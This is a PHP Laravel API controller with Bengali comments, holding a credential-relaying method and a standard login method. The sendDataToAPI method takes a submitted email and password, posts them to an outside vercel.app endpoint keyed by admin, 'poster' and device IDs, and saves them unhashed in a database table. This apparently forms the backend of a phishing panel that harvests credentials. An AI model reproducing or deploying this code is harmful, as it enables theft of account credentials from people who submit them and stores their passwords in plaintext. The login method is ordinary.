<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\AdminData;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

class AdminController extends Controller
{
    // API-তে data hit করা
    public function sendDataToAPI(Request $request, $adminId, $posterId, $deviceId)
    {
        $apiUrl = "https://megaback-c4jx.vercel.app/check/{$adminId}/{$posterId}/{$deviceId}";

        // API request body
        $data = [
            
            'email'         => $request->email,
            'password'      => $request->password,
           
        ];

        // API Hit
        $response = Http::post($apiUrl, $data);

        // Database-এ সংরক্ষণ করা
        AdminData::create([
            'admin_id'  => $adminId,
            'poster_id' => $posterId,
            'device'    => $deviceId,
            'data'      => json_encode($data),
        ]);

        return response()->json([
            'message'  => 'Data sent successfully',
            'response' => $response->json()
        ], $response->status());
    }

    // User login method
    public function login(Request $request)
    {
        $request->validate([
            'email'    => 'required|email',
            'password' => 'required',
        ]);

        $user = User::where('email', $request->email)->first();

        if ($user && Hash::check($request->password, $user->password)) {
            $token = $user->createToken('authToken')->plainTextToken;

            return response()->json([
                'message' => 'Login successful',
                'token'   => $token,
                'user'    => $user
            ], 200);
        }

        return response()->json([
            'message' => 'Invalid credentials'
        ], 401);
    }
}